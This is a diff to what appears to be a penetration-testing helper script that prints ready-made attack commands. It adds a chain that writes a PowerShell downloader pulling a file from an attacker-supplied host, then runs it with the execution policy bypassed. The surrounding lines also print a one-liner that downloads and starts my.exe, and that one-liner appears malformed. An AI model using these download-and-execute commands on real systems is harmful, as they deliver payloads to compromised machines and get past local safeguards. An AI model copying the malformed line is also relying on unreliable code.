@@ -7,6 +7,11 @@ printf "\n\n"
 printf "dirb http://$1"
 printf "\n\n"
 
+printf "echo $wc=New-Object Net.WebClient>w.ps1 && echo $u=\"http://$1/$3\">>w.ps1 && echo $f=$3>>w.ps1 && echo $wc.DownloadFile($u,$f)>>w.ps1"
+printf "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File w.ps1"
+printf "\n\n"
+
+
 printf "$wc = New-Object System.Net.WebClient;$wc.DownloadFile(http://$1:$2, \"C:\Users\Public\");Start-Process -Filepath \"C:\Users\Public\my.exe\""
 printf "\n\n"
 
